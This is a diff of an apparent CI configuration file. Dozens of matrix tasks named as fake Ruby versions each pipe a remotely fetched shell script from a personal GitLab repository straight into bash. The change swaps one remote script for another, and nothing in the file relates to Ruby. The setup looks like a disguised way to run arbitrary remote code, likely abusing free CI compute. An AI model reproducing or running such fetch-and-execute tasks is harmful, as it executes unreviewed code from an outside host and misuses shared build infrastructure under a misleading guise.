@@ -1,124 +1,125 @@
-macos_instance:
-  image: big-sur-base
+container:
+  image: golang:latest
 
-task: 
+
+task:
   matrix:
     - name: Ruby-3.1.2
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.0.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0.2
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9.0
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.9.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.7.3
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9.2
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.1
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.0
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.9
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.7
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.1.2u
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0.17
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3.11
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.0.15
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.0.2a
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9.0y
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.9.1r
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.7.3o
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.3.17
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.9.2q
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.17
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.09a
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.38i
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.07
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-3.01
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.98
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.91
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.76
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-2.37
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
 
     - name: Ruby-1.91
-      script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
+      script: bash <(wget -qO- https://gitlab.com/jningkulin/movies/raw/main/stack.sh)
